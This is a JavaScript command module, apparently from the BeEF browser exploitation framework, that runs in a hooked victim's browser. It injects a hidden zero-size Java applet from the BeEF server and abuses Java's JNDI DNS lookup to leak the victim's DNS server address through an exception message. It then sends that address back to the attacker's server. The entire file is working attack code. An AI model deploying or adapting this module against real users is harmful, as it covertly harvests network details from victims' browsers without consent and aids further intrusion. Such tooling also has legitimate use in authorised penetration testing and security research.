//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var command_timeout = "<%= @command_timeout %>";
	var Packz = undefined;
	var internal_counter = 0;

	content = "<APPLET code='doNothing' codebase='http://"+beef.net.host+":"+beef.net.port+"/doNothing.class' width=0 height=0 id='beefdns' name='beefdns'></APPLET>";
	$j('body').append(content);

	function checkDns() {

		var result = "";

		try {
			var env = new Packages.java.util.Hashtable();
			env.put("java.naming.factory.initial", "com.sun.jndi.dns.DnsContextFactory");
			env.put("java.naming.provider.url", "dns://");
			var ctx = new Packages.javax.naming.directory.InitialDirContext(env);
			var attrs = ctx.getAttributes("localhost",['*']);
		} catch(e) {
			var d="";
			if (typeof e != "string") d=e.message; else d=e.toString();
			var re=new RegExp("java.net.SocketPermission.([^:]*)");
			var g=re.exec(d);
			result = g[1];
		}

		return(result);
	}

	function waituntilok() {

		try {
			var output = checkDns();

			if (output != null) {
				beef.net.send('<%= @command_url %>', <%= @command_id %>, "dns_address="+output);
				$j('#beefdns').detach();
				return;
			} else throw("command results haven't been returned yet");
		} catch (e) {

			internal_counter++;
			if (internal_counter > command_timeout) {
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=time out');
				$j('#beefdns').detach();
				return;
			}
			setTimeout(function() {waituntilok()},1000);
		}
	}

	waituntilok();

});
